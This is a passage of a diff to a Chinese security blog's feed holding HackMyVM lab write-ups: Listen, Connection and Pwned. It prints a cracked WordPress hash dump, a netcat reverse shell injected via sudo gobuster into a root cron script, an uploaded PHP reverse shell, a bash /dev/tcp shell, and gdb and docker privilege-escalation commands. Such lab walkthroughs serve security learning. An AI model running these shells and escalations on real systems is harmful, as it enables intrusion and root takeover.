-<p>welcome@listen:&#x2F;tmp$ echo “nc -e &#x2F;bin&#x2F;bash 192.168.240.83 1234 “ &gt; b<br>welcome@listen:&#x2F;tmp$ chmod 777 b<br>welcome@listen:&#x2F;tmp$ echo “tmp&#x2F;b” &gt; b.txt<br>welcome@listen:&#x2F;tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o ┌──(root㉿kakeru)-[~&#x2F;tmp]<br>bash: syntax error near unexpected token &#96;(‘<br>welcome@listen:&#x2F;tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o &#x2F;opt&#x2F;.test.sh<br>2025&#x2F;02&#x2F;05 05:42:21 [!] unable to connect to <a href="http://192.168.240.83/">http://192.168.240.83/</a>: Get <a href="http://192.168.240.83/">http://192.168.240.83/</a>: dial tcp 192.168.240.83:80: connect: connection refused<br>welcome@listen:&#x2F;tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o &#x2F;opt&#x2F;.test.sh<br>welcome@listen:&#x2F;tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o &#x2F;opt&#x2F;.test.sh</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">用我这种方式扫目录，要在本机主目录下开<span class="keyword">http</span>，不然没有tmp目录</span><br></pre></td></tr></table></figure></div>
-<p>┌──(root㉿kakeru)-[~]<br>└─# nc -lp 1234<br>id</p>
-<p>id<br>uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<br>uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<br>&#96;&#96;&#96;</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; select <span class="symbol">*</span> from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string"> ID </span>|<span class="string"> user_login </span>|<span class="string"> user_pass                          </span>|<span class="string"> user_nicename </span>|<span class="string"> user_email        </span>|<span class="string"> user_url              </span>|<span class="string"> user_registered     </span>|<span class="string"> user_activation_key                           </span>|<span class="string"> user_status </span>|<span class="string"> display_name </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> ta0        </span>|<span class="string"> $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. </span>|<span class="string"> ta0           </span>|<span class="string"> 2814928906@qq.com </span>|<span class="string"> http://192.168.31.181 </span>|<span class="string"> 2025-01-08 03:10:43 </span>|<span class="string">                                               </span>|<span class="string">           0 </span>|<span class="string"> ta0          </span>|</span><br><span class="line">|<span class="string">  2 </span>|<span class="string"> welcome    </span>|<span class="string"> $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ </span>|<span class="string"> welcome       </span>|<span class="string"> 127.0.0.1@qq.com  </span>|<span class="string">                       </span>|<span class="string"> 2025-01-08 04:29:28 </span>|<span class="string"> 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. </span>|<span class="string">           0 </span>|<span class="string"> welcome      </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">2 rows in set (0.014 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wordpress]&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>得到两个用户名和密码,然后用john可以跑出来welcome的密码,接下来就切换到welcome用户操作</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># john tmp                                                                             </span></span><br><span class="line">Using default input <span class="params">encoding:</span> UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (phpass [phpass ($P$ <span class="keyword">or</span> $H$) <span class="number">128</span><span class="symbol">/128</span> ASIMD <span class="number">4</span>x2])</span><br><span class="line">Cost <span class="number">1</span> (iteration count) is <span class="number">8192</span> for all loaded hashes</span><br><span class="line">Will run <span class="number">2</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; <span class="keyword">or</span> Ctrl-C to <span class="built_in">abort</span>, almost any other key for status</span><br><span class="line">Almost <span class="params">done:</span> Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:<span class="symbol">/usr/share/john/password.lst</span></span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line"><span class="number">104567</span>           (<span class="operator">?</span>)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">22</span> DONE <span class="number">3</span><span class="symbol">/3</span> (<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">18</span>:<span class="number">05</span>) <span class="number">0.04403</span>g<span class="symbol">/s</span> <span class="number">8169</span>p<span class="symbol">/s</span> <span class="number">8169</span>c<span class="symbol">/s</span> <span class="number">8169</span>C<span class="symbol">/s</span> milling1..<span class="number">192011</span></span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+<p>有一个gobuster的sudo权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> welcome on <span class="symbol">listen:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> welcome may run the following commands on <span class="symbol">listen:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/gobuster</span><br></pre></td></tr></table></figure></div>
+<p>现在需要我们用一个pspy64程序看定时任务 下载地址在<br><code>https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">welcome@listen:~$ wget <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">1</span>5--  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span><span class="symbol">/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">240.83</span>:<span class="number">8080</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                       <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.1</span>s    </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">05</span>:<span class="number">17</span>:<span class="number">15</span> (<span class="number">30.4</span> MB<span class="operator">/</span>s) <span class="operator">-</span> ‘pspy64’ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">welcome@listen:~$ chmod <span class="number">777</span> pspy64</span><br><span class="line">welcome@listen:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2047</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2048</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">18</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2049</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2050</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2051</span>   | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/05</span> <span class="number">05</span>:<span class="number">19</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2052</span>   | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c <span class="symbol">/bin/bash</span> <span class="symbol">/opt/.test.sh</span> </span><br></pre></td></tr></table></figure></div>
+<p>看到root会定时写入&#x2F;opt&#x2F;.test.sh<br>所以我们的目标就是在.test.sh中写入文件 （反弹shell）<br>大佬们的思路太nb了,就是利用gobuster输出结果的回显来写入命令<br>具体是这样的: 在本机开http服务,创建文件夹，在靶机用gobuster自己创一个字典，指向我们在本机的文件夹，这样就会显示靶机中字典文件中的内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"> ──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# touch a</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /f7c3be62-4f83-404f-9236-89f88603c3f8 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168.240.231</span> - - <span class="string">[05/Feb/2025 18:37:20]</span> <span class="string">&quot;<span class="keyword">GET</span> /a HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">welcome@listen:/tmp$ touch a.txt     </span><br><span class="line">welcome@listen:/tmp$ echo <span class="string">&quot;a&quot;</span> &gt; a.txt </span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">welcome@listen:/tmp$ sudo gobuster -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">83</span> -w /tmp/a.txt -q -n</span><br><span class="line">/a</span><br></pre></td></tr></table></figure></div>
+<p>因为gobuster找到字典中可以访问的目录就会显示 <code>-q -n</code>是为了不输出banner和状态码<br>这样字我们就可以写反弹shell了 用-o将结果输出到&#x2F;opt&#x2F;.test.sh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─<span class="comment"># touch b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e /bin/bash 192.168.240.83 1234 &quot;</span> &gt; b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">777</span> b</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>echo <span class="string">&quot;tmp/b&quot;</span> &gt; b.txt</span><br><span class="line">welcome<span class="variable">@listen</span><span class="symbol">:/tmp</span><span class="variable">$ </span>sudo gobuster -u <span class="number">192.168</span>.<span class="number">240.83</span> -w b.txt -q -n -o ┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="symbol">bash:</span> syntax error near unexpected token `(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">2025/02/05 05:42:21 [!] unable to connect to http://192.168.240.83/: Get http://192.168.240.83/: dial tcp 192.168.240.83:80: connect: connection refused</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br><span class="line"><span class="string">welcome@listen:/tmp$ sudo gobuster -u 192.168.240.83 -w b.txt -q -n -o /opt/.test.sh</span></span><br></pre></td></tr></table></figure></div>
+<p>用我这种方式扫目录，要在本机主目录下开http，不然没有tmp目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# nc -lp 1234              </span><br><span class="line">id</span><br><span class="line">  </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>靶场</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-Connection</title>
+    <url>/posts/10052.html</url>
+    <content><![CDATA[<p>HMV-Connection靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f7d0e0a243d4f878cd.png"></p>
+<h1 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h1><p>无法获取ip 在开始之前要先进入拯救者模式中修改 网卡信息</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3d3bd0e0a243d4f879fa.png" alt="|750"><br>端口有4个  有http  ssh 还有smb服务 这个服务刚学到 是一个文件共享的服务 </p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里主要先考虑http和22端口<br>用dirsearch发现没有其他有用的界面   80端口是一个默认的index界面没有有用的信息<br>ssh 也不能直接登录上去  需要密码<br>所以考虑这个smb服务<br>用enum4linux -S 列举出smb共享资源<br><img src="https://pic1.imgdb.cn/item/679a3d40d0e0a243d4f879fb.png"><br>登录到share    – 利用smbclient  -N  匿名登录  <code>smbclient -N \\\\192.168.240.237\\share</code><br>这里要用反斜杠转义<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879fe.png"><br>登录进来之后也只看到只有一个html文件     然后我们从本地上传一个反弹shell的文件<br><code>put php-reverse-shell.php</code>  因为share这个文件夹只有只读权限所以进到html中上传<br>上传成功后 在本地监听  web端进入这个php文件  然后就可以获得shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/connections]</span><br><span class="line">└─# nc -lp 1234</span><br><span class="line">Linux<span class="built_in"> connection </span>4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 07:18:55 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ clear</span></span><br><span class="line"><span class="string">TERM environment variable not set.</span></span><br><span class="line"><span class="string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用suid提权<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879ff.png" alt="|500"><br>这里使用gdb提权<br>在<a href="https://gtfobins.github.io/gtfobins/gdb/">gtfobins</a> 中找到提权方案</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="symbol">/usr/bin/gdb</span> <span class="operator">-</span>nx <span class="operator">-</span>ex &#x27;python <span class="built_in">import</span> os; os.execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-p&quot;</span>)&#x27; <span class="operator">-</span>ex quit</span><br></pre></td></tr></table></figure></div>
+<p>拿到root权限<br>分别在&#x2F;root 和&#x2F;home&#x2F;connection 中找到flag</p>
+<h3 id="解释-gdb-命令"><a href="#解释-gdb-命令" class="headerlink" title="解释 gdb 命令"></a>解释 <code>gdb</code> 命令</h3><h2 id="1-usr-bin-gdb"><a href="#1-usr-bin-gdb" class="headerlink" title="1. /usr/bin/gdb"></a>1. <code>/usr/bin/gdb</code></h2><ul>
+<li><strong>作用</strong>：这是 <code>gdb</code> 命令的完整路径，表示调用的是系统中的 GNU 调试器（GDB）。<code>gdb</code> 是一个强大的调试工具，通常用于调试程序，也能执行低级操作，如调用系统命令或执行特定代码。</li>
+</ul>
+<h2 id="2-nx"><a href="#2-nx" class="headerlink" title="2. -nx"></a>2. <code>-nx</code></h2><ul>
+<li><strong><code>-n</code></strong>：启动时不执行任何初始化文件（如 <code>.gdbinit</code>），避免加载默认设置或用户配置文件。</li>
+<li><strong><code>-x</code></strong>：指定 <code>gdb</code> 执行的脚本文件，但在此命令中使用 <code>-ex</code> 代替，执行内联命令。</li>
+</ul>
+<h2 id="3-ex-python-import-os-os-execl-bin-bash-bash-p"><a href="#3-ex-python-import-os-os-execl-bin-bash-bash-p" class="headerlink" title="3. -ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;"></a>3. <code>-ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;</code></h2><ul>
+<li><strong><code>-ex</code></strong>：用于执行 <code>gdb</code> 启动时要运行的命令，支持多次使用。</li>
+<li><strong>Python 脚本</strong>：<ul>
+<li><strong><code>import os</code></strong>：导入 <code>os</code> 模块，用于与操作系统交互。</li>
+<li><strong><code>os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code></strong>：用 <code>execl</code> 替换当前进程（<code>gdb</code>）为新的进程，即启动 <code>bash</code> shell。<ul>
+<li><strong><code>/bin/bash</code></strong>：指定执行的程序，即 <code>bash</code> shell。</li>
+<li><strong><code>&quot;bash&quot;</code></strong>：传递给 <code>bash</code> 的参数，第一个参数通常是执行命令本身。</li>
+<li><strong><code>&quot;-p&quot;</code></strong>：让 <code>bash</code> 保持 <code>root</code> 权限，如果 <code>gdb</code> 以 <code>root</code> 权限运行，新启动的 <code>bash</code> shell 也会保持 <code>root</code> 权限。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-ex-quit"><a href="#4-ex-quit" class="headerlink" title="4. -ex quit"></a>4. <code>-ex quit</code></h2><ul>
+<li><strong>作用</strong>：在执行完上述 Python 脚本后，立即退出 <code>gdb</code>。<code>gdb</code> 执行完命令后会退出，但新启动的 <code>bash</code> shell 会继续运行。</li>
+</ul>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -2004,8 +1965,8 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>HMV</tag>
         <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -2024,97 +1985,8 @@ root@flower:/#
       </categories>
       <tags>
         <tag>渗透</tag>
+        <tag>靶场</tag>
         <tag>HMV</tag>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Pwned</title>
-    <url>/posts/3123.html</url>
-    <content><![CDATA[<p>HMV-Pwned靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png"></p>
-<h1 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h1><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><img src="https://pic1.imgdb.cn/item/679a3c54d0e0a243d4f879d6.png" alt="|275"><br>开放了三个端口 ftp ssh  http  </p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>访问80端口 网页中只有一句话和一个注释<br><img src="https://pic1.imgdb.cn/item/679a3c55d0e0a243d4f879d7.png"><br><img src="https://pic1.imgdb.cn/item/679a3c58d0e0a243d4f879d8.png" alt="|450"><br>说明员工里面有一个女性<br>然后用dirsearch跑一遍   发现之后一个nothing目录  nothing里面确实是nothing😂<br>这里没有可以注入的点  也没有找到可以进入的目录   没有任何的方向了 说明一定是信息收集不够<br>用gobuster再跑一遍   <code>gobuster dir -u 192.168.240.74 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60</code><br>发现了新的目录  &#x2F;hidden_text<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879d9.png"><br>找到一个文件  里面又是一些目录的字典 现在再用dirsearch跑一遍     然后进入那个可以访问的界面<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879da.png" alt="|375"><br><img src="https://pic1.imgdb.cn/item/679a3c89d0e0a243d4f879e3.png"><br>进入后有一个登录界面  但是没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a3c8ad0e0a243d4f879e4.png" alt="|500"><br>发现有一个注释  注释里面有有用户名ftpuser 密码 B0ss_B!TcH  所以可以登录ftp 还能登录ssh</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3c8cd0e0a243d4f879e5.png" alt="|375"><br>进入这个shell之后发现里面有两个文件  一个是rsa的私钥  然后告诉了我们一个用户ariana<br>现在就用这个私钥进入这个用户  在登录之前要先chmod 600<br>拿到ariana的shell<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e6.png"><br>找到了另外一个用户selena<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e7.png"><br>sudo -l 发现可以执行一个脚本<br><img src="https://pic1.imgdb.cn/item/679a3cb8d0e0a243d4f879ee.png"><br>脚本中的内容为：<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879ef.png" alt="|650"><br>这个脚本会echo $msg 就是你写入的消息会被打出来  所以我们可以用selena身份执行脚本  然后得到bash<br>这里nc 没有-e指令 学习一种新的反弹shell方式<br><code>bash -i &gt;&amp;/dev/tcp/ 攻击机_IP / 攻击机端口 0&gt;&amp;1</code>  <a href="https://blog.csdn.net/qq_64177395/article/details/143491556">反弹shell</a><br>这里我们直接发bash得到selena 的 shell<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879f0.png"><br>发现id在docker组 要用docker提权<br><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p>
-<h2 id="docker提权命令详细解释"><a href="#docker提权命令详细解释" class="headerlink" title="docker提权命令详细解释"></a>docker提权命令详细解释</h2><h4 id="1-docker-run"><a href="#1-docker-run" class="headerlink" title="1. docker run"></a>1. <code>docker run</code></h4><p>这是 Docker 命令，用于启动一个新的容器并运行指定的命令。</p>
-<h4 id="2-v-mnt"><a href="#2-v-mnt" class="headerlink" title="2. -v /:/mnt"></a>2. <code>-v /:/mnt</code></h4><ul>
-<li><code>-v</code> 是 Docker 的卷挂载选项，用于将宿主机的文件系统挂载到容器中。</li>
-<li><code>/</code> 表示宿主机的根文件系统。</li>
-<li><code>/mnt</code> 是容器内部的挂载点。</li>
-</ul>
-<p>所以，<code>-v /:/mnt</code> 这部分命令的作用是将宿主机的根文件系统 <code>/</code> 挂载到容器内部的 <code>/mnt</code> 目录。</p>
-<h4 id="3-rm"><a href="#3-rm" class="headerlink" title="3. --rm"></a>3. <code>--rm</code></h4><ul>
-<li><code>--rm</code> 表示在容器停止后自动删除容器。这使得容器在退出后不会在 Docker 主机上留下残余文件。</li>
-</ul>
-<h4 id="4-it"><a href="#4-it" class="headerlink" title="4. -it"></a>4. <code>-it</code></h4><ul>
-<li><code>-i</code>：保持容器的标准输入打开（交互式模式）。</li>
-<li><code>-t</code>：为容器分配一个伪终端，这样可以进行交互式操作。</li>
-</ul>
-<p>这两个选项组合起来意味着容器将以交互式模式运行，允许用户在容器内执行命令。</p>
-<h4 id="5-alpine"><a href="#5-alpine" class="headerlink" title="5. alpine"></a>5. <code>alpine</code></h4><ul>
-<li>这是一个小型的 Linux 发行版镜像，通常用于构建轻量级的 Docker 容器。它包含最基本的工具和库，非常适合用作基础镜像。</li>
-</ul>
-<h4 id="6-chroot-mnt"><a href="#6-chroot-mnt" class="headerlink" title="6. chroot /mnt"></a>6. <code>chroot /mnt</code></h4><ul>
-<li><code>chroot</code> 是 Linux 中的一个命令，用于改变当前进程的根目录。执行 <code>chroot /mnt</code> 后，容器内的文件系统根目录变成了 <code>/mnt</code>，而 <code>mnt</code> 被挂载到了宿主机的根文件系统 <code>/</code>。</li>
-<li>这意味着，容器内的程序和命令将认为 <code>/mnt</code> 是文件系统的根目录。由于 <code>/mnt</code> 映射了宿主机的根文件系统，这实际上使得容器内部的进程进入了宿主机的文件系统环境。</li>
-</ul>
-<h4 id="7-sh"><a href="#7-sh" class="headerlink" title="7. sh"></a>7. <code>sh</code></h4><ul>
-<li><code>sh</code> 是在容器中执行的命令，它启动一个 shell（即 <code>sh</code>），允许你在容器内与宿主机的根文件系统交互。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>HMV</tag>
-        <tag>靶场</tag>
-      </tags>
